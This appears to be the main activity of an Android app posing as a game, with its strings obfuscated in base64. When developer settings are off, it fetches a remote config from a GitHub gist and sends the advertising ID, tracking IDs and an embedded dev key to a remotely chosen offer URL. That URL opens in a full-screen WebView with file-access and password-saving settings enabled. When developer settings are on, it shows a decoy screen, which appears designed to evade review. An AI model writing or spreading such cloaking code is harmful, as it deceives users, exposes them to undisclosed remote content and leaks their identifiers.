package com.cyhrer.rlol;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.preference.PreferenceManager;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.View;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.onesignal.OneSignal;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;
import java.util.Objects;

public class CR extends AppCompatActivity {
    private ValueCallback<Uri[]> lolfilelolClbkcomcyhrerrlol;
    private String filolleCameracomcyhrerrlol;
    private ValueCallback<Uri> infoSavecomcyhrerrlol;
    private Uri infoUricomcyhrerrlol;
    private String infololCameralolPhotocomcyhrerrlol;
    private WebView infoViewcomcyhrerrlol;
    private String[] arraycomcyhrerrlol;
    private String offercomcyhrerrlol;
    private String keyGistcomcyhrerrlol;
    private String mettaIdcomcyhrerrlol;
    private String saveLinkcomcyhrerrlol;
    private String linkMettacomcyhrerrlol;
    private String idShopcomcyhrerrlol;
    private String appsIdSeccomcyhrerrlol;
    private String statusMaincomcyhrerrlol = "";
    private String paramscomcyhrerrlol;

    private static final String ONE_SIGNAL_COMCYHRERRLOL = "NDkzZDA2NjYtNGQ1MC00Y2Q2LWEzMDktMGI3YmNkYWM5YmM2";
    private static final String APPS_ID_COMCYHRERRLOL = "dEduY0ZtS1Z2ZEQ1SGFVYVVKazdLQQ==";
    private static final String GIST_LINK_COMCYHRERRLOL = "aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9SS0RldjExL2VmMjdlMGJmODU4MjdlMDFlOWY5NzA1NGVlZjcxZjkxL3Jhdy9DaGVycnklMjUyMHJvbGw=";


    @Override
    protected void onActivityResult(int requestCodecomcyhrerrlol, int resultCodecomcyhrerrlol, @Nullable Intent datacomcyhrerrlol) {
        super.onActivityResult(requestCodecomcyhrerrlol, resultCodecomcyhrerrlol, datacomcyhrerrlol);
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            if (requestCodecomcyhrerrlol == 1) {
                if (null == this.infoSavecomcyhrerrlol) {
                    return;
                }
                Uri infoResumecomcyhrerrlol = null;
                try {
                    if (resultCodecomcyhrerrlol != RESULT_OK) {
                        infoResumecomcyhrerrlol = null;
                    } else {
                        infoResumecomcyhrerrlol = datacomcyhrerrlol == null ? infoUricomcyhrerrlol : datacomcyhrerrlol.getData();
                    }
                } catch (Exception e) {

                }
                infoSavecomcyhrerrlol.onReceiveValue(infoResumecomcyhrerrlol);
                infoSavecomcyhrerrlol = null;
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            if (requestCodecomcyhrerrlol != 1 || lolfilelolClbkcomcyhrerrlol == null) {
                super.onActivityResult(requestCodecomcyhrerrlol, resultCodecomcyhrerrlol, datacomcyhrerrlol);
                return;
            }
            Uri[] resultscomcyhrerrlol = null;
            if (resultCodecomcyhrerrlol == Activity.RESULT_OK) {
                if (datacomcyhrerrlol == null || datacomcyhrerrlol.getData() == null) {
                    if (infololCameralolPhotocomcyhrerrlol != null) {
                        resultscomcyhrerrlol = new Uri[]{Uri.parse(infololCameralolPhotocomcyhrerrlol)};
                    }
                } else {
                    String dataStringcomcyhrerrlol = datacomcyhrerrlol.getDataString();
                    if (dataStringcomcyhrerrlol != null) {
                        resultscomcyhrerrlol = new Uri[]{Uri.parse(dataStringcomcyhrerrlol)};
                    }
                }
            }
            lolfilelolClbkcomcyhrerrlol.onReceiveValue(resultscomcyhrerrlol);
            lolfilelolClbkcomcyhrerrlol = null;
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        getWindow().addFlags(1024);
        infoViewcomcyhrerrlol = findViewById(R.id.webInfo);

        AppsFlyerLib.getInstance().init(Rator(APPS_ID_COMCYHRERRLOL), apcomcyhrerrlol, CR.this);
        AppsFlyerLib.getInstance().start(CR.this);
        appsIdSeccomcyhrerrlol = AppsFlyerLib.getInstance().getAppsFlyerUID(CR.this);

        int devInfocomcyhrerrlol = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);

        if (devInfocomcyhrerrlol == 1) {
            Intent intentGame = new Intent(this, InfoActyvity.class);
            startActivity(intentGame);
            finishAffinity();
        } else if (devInfocomcyhrerrlol == 0) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        com.onesignal.OneSignal.setLogLevel(com.onesignal.OneSignal.LOG_LEVEL.VERBOSE, com.onesignal.OneSignal.LOG_LEVEL.NONE);
                        com.onesignal.OneSignal.initWithContext(CR.this);
                        com.onesignal.OneSignal.setAppId(Rator(ONE_SIGNAL_COMCYHRERRLOL));

                        idShopcomcyhrerrlol = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                        HttpURLConnection con = (HttpURLConnection) new URL(Rator(GIST_LINK_COMCYHRERRLOL)).openConnection();
                        BufferedReader bufcomcyhrerrlol = new BufferedReader(new InputStreamReader(con.getInputStream()));

                        String canList = bufcomcyhrerrlol.readLine();
                        Nastr(canList);

                        FacebookSdk.setApplicationId(mettaIdcomcyhrerrlol);
                        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
                        FacebookSdk.fullyInitialize();
                        FacebookSdk.setAutoInitEnabled(true);
                        FacebookSdk.setAutoLogAppEventsEnabled(true);
                        AppLinkData.fetchDeferredAppLinkData(CR.this,
                                new AppLinkData.CompletionHandler() {
                                    @Override
                                    public void onDeferredAppLinkDataFetched(AppLinkData appLinkDatacomcyhrerrlol) {
                                        if (appLinkDatacomcyhrerrlol == null) {
                                            appLinkDatacomcyhrerrlol = AppLinkData.createFromActivity(CR.this);
                                        }
                                        if (appLinkDatacomcyhrerrlol != null) {
                                            Uri uri = appLinkDatacomcyhrerrlol.getTargetUri();
                                            String infoMetta = uri.getQuery();
                                            linkMettacomcyhrerrlol = TrueSeparation(infoMetta);
                                        }
                                    }
                                });
                    } catch (Exception e) {

                    }
                }
            }).start();

            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    try {
                        WebSetting(infoViewcomcyhrerrlol);

                        SharedPreferences pprefSpcomcyhrerrlol = PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
                        saveLinkcomcyhrerrlol = pprefSpcomcyhrerrlol.getString(Rator("ZWZfeWVr"), null);
                        if (saveLinkcomcyhrerrlol != null) {
                            infoViewcomcyhrerrlol.loadUrl(saveLinkcomcyhrerrlol);
                            infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
                        } else {
                            new Handler().postDelayed(new Runnable() {
                                @Override
                                public void run() {
                                    SecondAudit();
                                }
                            }, 5000);
                        }

                    } catch (Exception e) {
                    }
                }
            });
        }
    }

    AppsFlyerConversionListener apcomcyhrerrlol = new AppsFlyerConversionListener() {
        @Override
        public void onConversionDataSuccess(Map<String, Object> mapcomcyhrerrlol) {
            statusMaincomcyhrerrlol = Objects.requireNonNull(mapcomcyhrerrlol.get(Rator("YWZfc3RhdHVz"))).toString();
            Log.i("My", "status: " + statusMaincomcyhrerrlol);
            if (statusMaincomcyhrerrlol.equals(Rator("Tm9uLW9yZ2FuaWM="))) {
                String campaingcomcyhrerrlol = Objects.requireNonNull(mapcomcyhrerrlol.get(Rator("Y2FtcGFpZ24="))).toString();
                paramscomcyhrerrlol = TrueSeparation(campaingcomcyhrerrlol);
            }
        }

        @Override
        public void onConversionDataFail(String s) {
        }

        @Override
        public void onAppOpenAttribution(Map<String, String> map) {
        }

        @Override
        public void onAttributionFailure(String s) {
        }
    };


    private void Nastr(String trueLinecomcyhrerrlol) {
        arraycomcyhrerrlol = trueLinecomcyhrerrlol.split("\\u007c");
        offercomcyhrerrlol = arraycomcyhrerrlol[0];
        keyGistcomcyhrerrlol = arraycomcyhrerrlol[1];
        mettaIdcomcyhrerrlol = arraycomcyhrerrlol[2];
    }


    private String TrueSeparation(String separcomcyhrerrlol) {
        String keycomcyhrerrlol;
        String sub6comcyhrerrlol;
        String sub7comcyhrerrlol;
        String sub2comcyhrerrlol;
        String sub3comcyhrerrlol;
        String sub4comcyhrerrlol;
        String sub5comcyhrerrlol;
        String[] linaArraycomcyhrerrlol = separcomcyhrerrlol.split(Rator("Ojo="));
        try {
            keycomcyhrerrlol = linaArraycomcyhrerrlol[0];
        } catch (NullPointerException e) {
            keycomcyhrerrlol = "";
        }
        try {
            sub6comcyhrerrlol = linaArraycomcyhrerrlol[1];
        } catch (NullPointerException e) {
            sub6comcyhrerrlol = "";
        }
        try {
            sub7comcyhrerrlol = linaArraycomcyhrerrlol[2];
        } catch (NullPointerException e) {
            sub7comcyhrerrlol = "";
        }
        try {
            sub2comcyhrerrlol = linaArraycomcyhrerrlol[3];
        } catch (NullPointerException e) {
            sub2comcyhrerrlol = "";
        }
        try {
            sub3comcyhrerrlol = linaArraycomcyhrerrlol[4];
        } catch (NullPointerException e) {
            sub3comcyhrerrlol = "";
        }
        try {
            sub4comcyhrerrlol = linaArraycomcyhrerrlol[5];
        } catch (NullPointerException e) {
            sub4comcyhrerrlol = "";
        }
        try {
            sub5comcyhrerrlol = linaArraycomcyhrerrlol[6];
        } catch (NullPointerException e) {
            sub5comcyhrerrlol = "";
        }
        OneSignal.sendTag(Rator("c3ViX2FwcA=="), sub6comcyhrerrlol);
        String lastcomcyhrerrlol = (keycomcyhrerrlol + Rator("P2J1bmRsZT0=") + (BuildConfig.APPLICATION_ID)
                + Rator("JmFkX2lkPQ==") + idShopcomcyhrerrlol + Rator("JmFwcHNfaWQ9") + appsIdSeccomcyhrerrlol +
                Rator("JmRldl9rZXk9") + Rator(APPS_ID_COMCYHRERRLOL) +
                Rator("JnN1YjY9") + sub6comcyhrerrlol +
                Rator("JnN1Yjc9") + sub7comcyhrerrlol +
                Rator("JnN1YjI9") + sub2comcyhrerrlol +
                Rator("JnN1YjM9") + sub3comcyhrerrlol +
                Rator("JnN1YjQ9") + sub4comcyhrerrlol +
                Rator("JnN1YjU9") + sub5comcyhrerrlol);
        return lastcomcyhrerrlol;
    }


    private void SecondAudit() {
        if (statusMaincomcyhrerrlol.equals(Rator("Tm9uLW9yZ2FuaWM="))) {
            String start = (offercomcyhrerrlol + paramscomcyhrerrlol);
            infoViewcomcyhrerrlol.loadUrl(start);
            infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
        } else if (linkMettacomcyhrerrlol != null) {
            String start = (offercomcyhrerrlol + linkMettacomcyhrerrlol);
            infoViewcomcyhrerrlol.loadUrl(start);
            infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
        } else {
            if (keyGistcomcyhrerrlol.equals(Rator("Tk8="))) {
                Intent intent = new Intent(this, InfoActyvity.class);
                this.startActivity(intent);
                this.finishAffinity();
                infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
            } else {
                String startSec = (keyGistcomcyhrerrlol + Rator("P2J1bmRsZT0=") + Rator("Y29tLnNzZXRjZXIub2VmbGpndW4=") +
                        Rator("JmFkX2lkPQ==") + idShopcomcyhrerrlol + Rator("JmFwcHNfaWQ9") +
                        appsIdSeccomcyhrerrlol + Rator("JmRldl9rZXk9") + Rator(APPS_ID_COMCYHRERRLOL));
                String start = (offercomcyhrerrlol + startSec);
                infoViewcomcyhrerrlol.loadUrl(start);
                infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
            }
        }
    }

    private void WebSetting(WebView webViewcomcyhrerrlol) {
        webViewcomcyhrerrlol.getSettings().setJavaScriptEnabled(true);
        webViewcomcyhrerrlol.getSettings().setAppCacheEnabled(true);
        webViewcomcyhrerrlol.getSettings().setDomStorageEnabled(true);
        webViewcomcyhrerrlol.getSettings().setAllowContentAccess(true);
        webViewcomcyhrerrlol.getSettings().setAllowFileAccess(true);
        webViewcomcyhrerrlol.getSettings().setAppCacheEnabled(true);
        webViewcomcyhrerrlol.getSettings().setAllowFileAccessFromFileURLs(true);
        webViewcomcyhrerrlol.getSettings().setSaveFormData(true);
        webViewcomcyhrerrlol.getSettings().setMixedContentMode(0);
        webViewcomcyhrerrlol.getSettings().setSavePassword(true);
        webViewcomcyhrerrlol.getSettings().setAllowContentAccess(true);
        webViewcomcyhrerrlol.getSettings().setLoadsImagesAutomatically(true);
        webViewcomcyhrerrlol.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webViewcomcyhrerrlol.getSettings().setDatabaseEnabled(true);
        webViewcomcyhrerrlol.getSettings().setLoadWithOverviewMode(true);
        webViewcomcyhrerrlol.getSettings().setUseWideViewPort(true);
        webViewcomcyhrerrlol.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webViewcomcyhrerrlol.getSettings().setDomStorageEnabled(true);
        webViewcomcyhrerrlol.getSettings().setAllowFileAccess(true);
        webViewcomcyhrerrlol.getSettings().setRenderPriority(WebSettings.RenderPriority.HIGH);
        webViewcomcyhrerrlol.getSettings().setEnableSmoothTransition(true);

        webViewcomcyhrerrlol.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onShowFileChooser(WebView webViewcomcyhrerrlol, ValueCallback<Uri[]> filePathCallbackcomcyhrerrlol, FileChooserParams fileChooserParamscomcyhrerrlol) {
                if (lolfilelolClbkcomcyhrerrlol != null) {
                    lolfilelolClbkcomcyhrerrlol.onReceiveValue(null);
                }
                lolfilelolClbkcomcyhrerrlol = filePathCallbackcomcyhrerrlol;

                Intent imContentcomcyhrerrlol = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
                if (imContentcomcyhrerrlol.resolveActivity(getPackageManager()) != null) {
                    File infoPhotocomcyhrerrlol = null;
                    try {
                        infoPhotocomcyhrerrlol = FileSet();
                        imContentcomcyhrerrlol.putExtra(Rator("UGhvdG9QYXRo"), filolleCameracomcyhrerrlol);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    if (infoPhotocomcyhrerrlol != null) {
                        filolleCameracomcyhrerrlol = Rator("ZmlsZTo=") + infoPhotocomcyhrerrlol.getAbsolutePath();
                        imContentcomcyhrerrlol.putExtra(MediaStore.EXTRA_OUTPUT, Uri.fromFile(infoPhotocomcyhrerrlol));
                    } else {
                        imContentcomcyhrerrlol = null;
                    }
                }
                Intent infoContent = new Intent(Intent.ACTION_GET_CONTENT);
                infoContent.addCategory(Intent.CATEGORY_OPENABLE);
                infoContent.setType(Rator("aW1hZ2UvKg=="));

                Intent[] listArrayInfo;
                if (imContentcomcyhrerrlol != null) {
                    listArrayInfo = new Intent[]{imContentcomcyhrerrlol};
                } else {
                    listArrayInfo = new Intent[0];
                }
                Intent chFileInfo = new Intent(Intent.ACTION_CHOOSER);
                chFileInfo.putExtra(Intent.EXTRA_INTENT, infoContent);
                chFileInfo.putExtra(Intent.EXTRA_TITLE, Rator("RmlsZSBDaG9vc2Vy"));
                chFileInfo.putExtra(Intent.EXTRA_INITIAL_INTENTS, listArrayInfo);
                startActivityForResult(chFileInfo, 1);
                return true;
            }

            public File FileSet() throws IOException {
                File infoFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                        Rator("RGlyZWN0b3J5TmFtZUhlcmU="));

                if (infoFile.exists()) {
                    infoFile.mkdirs();
                }
                infoFile = new File(infoFile + File.separator +
                        Rator("SU1HXw==") + String.valueOf(System.currentTimeMillis()) +
                        Rator("LmpwZw=="));
                return infoFile;
            }
        });
        webViewcomcyhrerrlol.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageStarted(WebView view, String url, Bitmap favicon) {
                super.onPageStarted(view, url, favicon);
                if (url.contains(Rator("NDA0"))) {
                    Intent intentLoad = new Intent(CR.this, InfoActyvity.class);
                    startActivity(intentLoad);
                    finishAffinity();
                }
            }

            @Override
            public void onPageFinished(WebView view, String url) {
                super.onPageFinished(view, url);
                SharedPreferences pref = PreferenceManager.getDefaultSharedPreferences(view.getContext());
                SharedPreferences.Editor edPref = pref.edit();
                edPref.putString(Rator("ZWZfeWVr"), url);
                edPref.apply();
            }
        });
    }

    public static String Rator(String info) {
        String file;
        return file = new String(Base64.decode(info, Base64.DEFAULT));
    }

    @Override
    public void onBackPressed() {
        if (infoViewcomcyhrerrlol.isFocused() && infoViewcomcyhrerrlol.canGoBack()) {
            infoViewcomcyhrerrlol.goBack();
        }
    }
}